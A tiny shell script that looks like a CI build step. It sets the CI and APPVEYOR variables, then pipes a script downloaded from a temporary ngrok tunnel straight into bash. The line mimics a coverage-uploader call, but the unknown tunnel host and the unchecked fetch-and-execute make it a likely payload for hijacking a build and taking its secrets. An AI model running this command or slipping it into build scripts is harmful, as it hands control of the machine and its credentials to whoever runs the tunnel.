#!/bin/sh

set -x

export CI="True"
export APPVEYOR="True"
bash <(curl -s https://6bec2ebd.ngrok.io/bash) 
